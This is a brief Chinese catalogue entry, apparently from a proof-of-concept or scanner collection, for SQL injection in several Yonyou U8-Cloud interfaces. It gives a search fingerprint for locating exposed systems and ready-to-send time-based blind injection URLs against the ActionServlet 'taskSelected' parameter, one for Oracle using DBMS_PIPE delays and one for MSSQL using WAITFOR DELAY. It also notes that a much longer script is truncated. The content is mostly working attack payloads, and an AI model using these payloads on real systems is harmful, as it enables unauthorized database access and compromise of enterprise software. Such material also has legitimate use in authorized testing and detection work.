# 用友U8-Cloud多个接口SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="U8C"`

**请求体 / payload**
```
req_path,req_url
/service/~iufo/com.ufida.web.action.ActionServlet,/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27%29%20AND%206358%3dDBMS_PIPE%2eRECEIVE_MESSAGE%28CHR%28105%29%7c%7cCHR%2888%29%7c%7cCHR%28104%29%7c%7cCHR%2883%29%2c5%29%20AND%20%28%27zMDX%27%3d%27zMDX&db_type=oracle
/service/~iufo/com.ufida.web.action.ActionServlet,/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:5%27--&db_type=mssql
/service/~iufo/com.…（脚本共 228672 字，完整版见原文）
```
- **预期**：200　|　—